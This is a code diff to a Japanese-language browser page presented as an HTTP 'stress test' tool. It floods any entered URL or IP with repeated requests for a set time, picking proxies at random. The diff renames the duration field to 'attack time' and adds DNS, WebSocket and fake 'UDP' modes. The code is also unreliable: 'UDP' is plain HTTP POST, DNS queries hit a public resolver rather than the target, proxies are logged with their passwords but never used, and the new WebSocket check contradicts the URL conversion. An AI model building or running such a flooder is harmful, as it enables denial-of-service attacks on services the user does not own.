@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>制御されたHTTPストレステストツール（プロキシ対応）</title>
+    <title>制御されたHTTPストレステストツール（プロキシ対応・拡張）</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -89,7 +89,7 @@
     </style>
 </head>
 <body>
-    <h1>制御されたHTTPストレステストツール（プロキシ対応）</h1>
+    <h1>制御されたHTTPストレステストツール（プロキシ対応・拡張）</h1>
     <div class="container">
         <label for="url">対象URLまたはIP</label>
         <input type="text" id="url" placeholder="例: http://example.com または 192.168.1.1" required>
@@ -97,18 +97,22 @@
         <label for="port">ポート（任意）</label>
         <input type="number" id="port" placeholder="自動検出の場合は空欄（例: HTTPは80）">
 
-        <label for="duration">テスト時間（秒）</label>
+        <label for="duration">攻撃時間（秒）</label>
         <input type="number" id="duration" placeholder="例: 10" min="1" required>
 
         <label for="method">リクエストメソッド</label>
         <select id="method" required>
             <option value="GET">HTTP GET</option>
             <option value="POST">HTTP POST</option>
+            <option value="DNS">DNS (DoH)</option>
+            <option value="WEBSOCKET">WebSocket</option>
+            <option value="UDP">UDP (HTTP代替)</option>
         </select>
 
         <label for="proxy">プロキシ設定（任意、複数可、1行に1プロキシ：サーバー:ポート:ユーザー名:パスワード）</label>
-        <textarea id="proxy" placeholder="例: 123.456.789.012:8080:username:password&#10;234.567.890.123:3128::"></textarea>
-        <p class="info">プロキシを使用する場合、ブラウザまたはOSのネットワーク設定でプロキシを有効にしてください。例: <a href="https://iproyal.com/free-proxy-list/" target="_blank">IPRoyalのフリープロキシリスト</a>から取得したプロキシを設定してください。ユーザー名/パスワードが空の場合、認証なしとみなされます。</p>
+        <textarea id="proxy" placeholder="例: 123.456.789.012:8080:username:password
+234.567.890.123:3128::"></textarea>
+        <p class="info">プロキシを使用する場合、ブラウザまたはOSのネットワーク設定でプロキシを有効にしてください。例: <a href="https://iproyal.com/free-proxy-list/" target="_blank">IPRoyalのフリープロキシリスト</a>から取得したプロキシを設定してください。ユーザー名/パスワードが空の場合、認証なしとみなされます。DNSはDoH、UDPはHTTP代替で動作します。</p>
 
         <button id="startBtn">攻撃開始</button>
         <div id="status"></div>
@@ -158,13 +162,13 @@
             return proxies;
         }
 
-        async function sendRequest(url, method, proxy = null) {
+        async function sendHttpRequest(url, method, proxy = null) {
             try {
                 const proxyInfo = proxy ? `${proxy.server}:${proxy.port} (ユーザー: ${proxy.username}, パスワード: ${proxy.password})` : 'プロキシなし';
                 const response = await fetch(url, {
-                    method: method,
+                    method: method === 'UDP' ? 'POST' : method, // UDPはHTTP POSTで代替
                     headers: { 'Content-Type': 'application/json' },
-                    body: method === 'POST' ? JSON.stringify({ test: 'data' }) : null,
+                    body: method === 'POST' || method === 'UDP' ? JSON.stringify({ test: 'data' }) : null,
                     mode: 'no-cors'
                 });
                 appendLog(`Request sent: ${method} ${url} via ${proxyInfo} - Success`, 'log-success');
@@ -175,20 +179,69 @@
             }
         }
 
+        async function sendDnsRequest(domain, proxy = null) {
+            const dnsUrl = `https://dns.google/resolve?name=${encodeURIComponent(domain)}`;
+            try {
+                const proxyInfo = proxy ? `${proxy.server}:${proxy.port} (ユーザー: ${proxy.username}, パスワード: ${proxy.password})` : 'プロキシなし';
+                const response = await fetch(dnsUrl, {
+                    method: 'GET',
+                    mode: 'no-cors'
+                });
+                appendLog(`DNS query sent: ${domain} via ${proxyInfo} - Success`, 'log-success');
+                return { success: true };
+            } catch (error) {
+                appendLog(`DNS query sent: ${domain} via ${proxyInfo} - Failed (${error.message})`, 'log-error');
+                return { success: false, error: error.message };
+            }
+        }
+
+        async function sendWebSocketRequest(url, proxy = null) {
+            return new Promise((resolve) => {
+                const proxyInfo = proxy ? `${proxy.server}:${proxy.port} (ユーザー: ${proxy.username}, パスワード: ${proxy.password})` : 'プロキシなし';
+                const wsUrl = url.replace(/^http/, 'ws'); // http:// → ws://, https:// → wss://
+                const ws = new WebSocket(wsUrl);
+                ws.onopen = () => {
+                    appendLog(`WebSocket connected: ${wsUrl} via ${proxyInfo} - Success`, 'log-success');
+                    ws.close();
+                    resolve({ success: true });
+                };
+                ws.onerror = (error) => {
+                    appendLog(`WebSocket connection: ${wsUrl} via ${proxyInfo} - Failed`, 'log-error');
+                    resolve({ success: false, error: 'WebSocket error' });
+                };
+            });
+        }
+
         async function runTest(url, duration, method, proxies) {
             const endTime = Date.now() + duration * 1000;
             let requestCount = 0;
             let successCount = 0;
             let errorCount = 0;
 
-            setStatus('攻撃実行中...', 'info');
+            setStatus('テスト実行中...', 'info');
             logDiv.innerHTML = '';
 
-            while (Date.now() < endTime && isTesting) {
-                // プロキシをランダムに選択（プロキシが入力されている場合）
-                const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
+            let domain = url;
+            try {
+                const urlObj = new URL(url.startsWith('http') ? url : `http://${url}`);
+                domain = urlObj.hostname; // DNSクエリ用にホスト名を抽出
+            } catch (e) {
+                setStatus('URLの形式が無効です。', 'error');
+                return;
+            }
 
-                const result = await sendRequest(url, method, proxy);
+            while (Date.now() < endTime && isTesting) {
+                const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
+                let result;
+
+                if (method === 'DNS') {
+                    result = await sendDnsRequest(domain, proxy);
+                } else if (method === 'WEBSOCKET') {
+                    result = await sendWebSocketRequest(url, proxy);
+                } else {
+                    result = await sendHttpRequest(url, method, proxy);
+                }
+
                 requestCount++;
                 if (result.success) {
                     successCount++;
@@ -257,6 +310,11 @@
             const proxies = parseProxies(proxyText);
             if (proxies.length > 0) {
                 appendLog('プロキシ設定をブラウザまたはOSで有効にしてください。', 'info');
+            }
+
+            if (method === 'WEBSOCKET' && !targetUrl.startsWith('ws')) {
+                appendLog('WebSocketはws://またはwss://で始まるURLが必要です。', 'error');
+                return;
             }
 
             isTesting = true;
